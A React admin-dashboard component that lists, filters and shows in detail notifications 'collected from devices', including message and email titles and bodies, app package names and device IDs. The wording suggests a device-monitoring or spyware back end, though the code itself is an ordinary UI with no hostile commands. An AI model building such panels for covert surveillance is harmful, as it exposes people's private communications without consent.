import React, { useState, useEffect } from 'react';
import { toast } from 'react-toastify';
import './AdminViews.css';

const NotificationsView = () => {
  const [notifications, setNotifications] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterCategory, setFilterCategory] = useState('all');
  const [filterRead, setFilterRead] = useState('all');
  const [currentPage, setCurrentPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [selectedNotification, setSelectedNotification] = useState(null);

  useEffect(() => {
    fetchNotifications();
  }, [currentPage, filterCategory, filterRead]);

  const fetchNotifications = async () => {
    try {
      setLoading(true);
      const response = await fetch(`/api/notifications?page=${currentPage}&category=${filterCategory}&read=${filterRead}`);
      if (response.ok) {
        const data = await response.json();
        setNotifications(data.notifications || []);
        setTotalPages(data.totalPages || 1);
      } else {
        toast.error('Failed to fetch notifications');
      }
    } catch (error) {
      console.error('Error fetching notifications:', error);
      toast.error('Error loading notifications');
    } finally {
      setLoading(false);
    }
  };

  const filteredNotifications = notifications.filter(notification =>
    notification.title.toLowerCase().includes(searchTerm.toLowerCase()) ||
    notification.body.toLowerCase().includes(searchTerm.toLowerCase()) ||
    notification.appName.toLowerCase().includes(searchTerm.toLowerCase()) ||
    notification.packageName.toLowerCase().includes(searchTerm.toLowerCase()) ||
    notification.deviceId.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleString();
  };

  const getCategoryBadge = (category) => {
    const categoryColors = {
      social: '#4CAF50',
      email: '#2196F3',
      messaging: '#FF9800',
      news: '#9C27B0',
      shopping: '#E91E63',
      other: '#607D8B'
    };
    
    return (
      <span 
        className="category-badge"
        style={{ backgroundColor: categoryColors[category] || '#607D8B' }}
      >
        {category}
      </span>
    );
  };

  const getReadBadge = (isRead) => {
    return (
      <span className={`read-badge ${isRead ? 'read' : 'unread'}`}>
        {isRead ? 'Read' : 'Unread'}
      </span>
    );
  };

  const viewNotificationDetails = (notification) => {
    setSelectedNotification(notification);
  };

  const closeModal = () => {
    setSelectedNotification(null);
  };

  const truncateText = (text, maxLength = 100) => {
    if (text.length <= maxLength) return text;
    return text.substring(0, maxLength) + '...';
  };

  if (loading) {
    return <div className="loading">Loading notifications...</div>;
  }

  return (
    <div className="admin-view">
      <div className="view-header">
        <h1>🔔 Notifications Management</h1>
        <p>Monitor all collected notifications from devices</p>
      </div>

      <div className="controls">
        <div className="search-filter">
          <input
            type="text"
            placeholder="Search notifications..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="search-input"
          />
          <select
            value={filterCategory}
            onChange={(e) => setFilterCategory(e.target.value)}
            className="filter-select"
          >
            <option value="all">All Categories</option>
            <option value="social">Social</option>
            <option value="email">Email</option>
            <option value="messaging">Messaging</option>
            <option value="news">News</option>
            <option value="shopping">Shopping</option>
            <option value="other">Other</option>
          </select>
          <select
            value={filterRead}
            onChange={(e) => setFilterRead(e.target.value)}
            className="filter-select"
          >
            <option value="all">All Status</option>
            <option value="read">Read Only</option>
            <option value="unread">Unread Only</option>
          </select>
        </div>
        <button onClick={fetchNotifications} className="refresh-btn">
          🔄 Refresh
        </button>
      </div>

      <div className="stats-summary">
        <div className="stat-item">
          <span className="stat-label">Total Notifications:</span>
          <span className="stat-value">{notifications.length}</span>
        </div>
        <div className="stat-item">
          <span className="stat-label">Unread:</span>
          <span className="stat-value">{notifications.filter(n => !n.isRead).length}</span>
        </div>
        <div className="stat-item">
          <span className="stat-label">Read:</span>
          <span className="stat-value">{notifications.filter(n => n.isRead).length}</span>
        </div>
      </div>

      <div className="data-table">
        <table>
          <thead>
            <tr>
              <th>App</th>
              <th>Title</th>
              <th>Body</th>
              <th>Device ID</th>
              <th>Category</th>
              <th>Status</th>
              <th>Timestamp</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            {filteredNotifications.map((notification) => (
              <tr key={notification._id}>
                <td>
                  <div className="app-info">
                    <div className="app-name">{notification.appName}</div>
                    <div className="package-name">{notification.packageName}</div>
                  </div>
                </td>
                <td>
                  <div className="notification-title">
                    {truncateText(notification.title, 50)}
                  </div>
                </td>
                <td>
                  <div className="notification-body">
                    {truncateText(notification.body, 80)}
                  </div>
                </td>
                <td>
                  <div className="device-id">
                    <span className="id-text">{notification.deviceId}</span>
                  </div>
                </td>
                <td>{getCategoryBadge(notification.category)}</td>
                <td>{getReadBadge(notification.isRead)}</td>
                <td>{formatDate(notification.timestamp)}</td>
                <td>
                  <button
                    onClick={() => viewNotificationDetails(notification)}
                    className="view-btn"
                  >
                    👁️ View
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {totalPages > 1 && (
        <div className="pagination">
          <button
            onClick={() => setCurrentPage(Math.max(1, currentPage - 1))}
            disabled={currentPage === 1}
            className="page-btn"
          >
            Previous
          </button>
          <span className="page-info">
            Page {currentPage} of {totalPages}
          </span>
          <button
            onClick={() => setCurrentPage(Math.min(totalPages, currentPage + 1))}
            disabled={currentPage === totalPages}
            className="page-btn"
          >
            Next
          </button>
        </div>
      )}

      {/* Notification Details Modal */}
      {selectedNotification && (
        <div className="modal-overlay" onClick={closeModal}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header">
              <h2>Notification Details</h2>
              <button onClick={closeModal} className="close-btn">×</button>
            </div>
            <div className="modal-body">
              <div className="detail-section">
                <h3>Basic Information</h3>
                <div className="detail-grid">
                  <div className="detail-item">
                    <label>App Name:</label>
                    <span>{selectedNotification.appName}</span>
                  </div>
                  <div className="detail-item">
                    <label>Package Name:</label>
                    <span>{selectedNotification.packageName}</span>
                  </div>
                  <div className="detail-item">
                    <label>Device ID:</label>
                    <span>{selectedNotification.deviceId}</span>
                  </div>
                  <div className="detail-item">
                    <label>Category:</label>
                    <span>{getCategoryBadge(selectedNotification.category)}</span>
                  </div>
                  <div className="detail-item">
                    <label>Priority:</label>
                    <span>{selectedNotification.priority}</span>
                  </div>
                  <div className="detail-item">
                    <label>Source:</label>
                    <span>{selectedNotification.source}</span>
                  </div>
                  <div className="detail-item">
                    <label>Status:</label>
                    <span>{getReadBadge(selectedNotification.isRead)}</span>
                  </div>
                </div>
              </div>

              <div className="detail-section">
                <h3>Notification Content</h3>
                <div className="detail-item full-width">
                  <label>Title:</label>
                  <div className="content-text">{selectedNotification.title}</div>
                </div>
                <div className="detail-item full-width">
                  <label>Body:</label>
                  <div className="content-text">{selectedNotification.body}</div>
                </div>
              </div>

              {selectedNotification.deviceInfo && (
                <div className="detail-section">
                  <h3>Device Information</h3>
                  <div className="detail-grid">
                    <div className="detail-item">
                      <label>User Agent:</label>
                      <span>{selectedNotification.deviceInfo.userAgent || 'N/A'}</span>
                    </div>
                    <div className="detail-item">
                      <label>Platform:</label>
                      <span>{selectedNotification.deviceInfo.platform || 'N/A'}</span>
                    </div>
                    <div className="detail-item">
                      <label>Language:</label>
                      <span>{selectedNotification.deviceInfo.language || 'N/A'}</span>
                    </div>
                    <div className="detail-item">
                      <label>Screen Resolution:</label>
                      <span>{selectedNotification.deviceInfo.screenResolution || 'N/A'}</span>
                    </div>
                    <div className="detail-item">
                      <label>Timezone:</label>
                      <span>{selectedNotification.deviceInfo.timezone || 'N/A'}</span>
                    </div>
                  </div>
                </div>
              )}

              {selectedNotification.notificationData && Object.keys(selectedNotification.notificationData).length > 0 && (
                <div className="detail-section">
                  <h3>Additional Data</h3>
                  <div className="notification-data">
                    <pre>{JSON.stringify(selectedNotification.notificationData, null, 2)}</pre>
                  </div>
                </div>
              )}

              <div className="detail-section">
                <h3>Timestamps</h3>
                <div className="detail-grid">
                  <div className="detail-item">
                    <label>Timestamp:</label>
                    <span>{formatDate(selectedNotification.timestamp)}</span>
                  </div>
                  <div className="detail-item">
                    <label>Created:</label>
                    <span>{formatDate(selectedNotification.createdAt)}</span>
                  </div>
                  <div className="detail-item">
                    <label>Updated:</label>
                    <span>{formatDate(selectedNotification.updatedAt)}</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default NotificationsView; 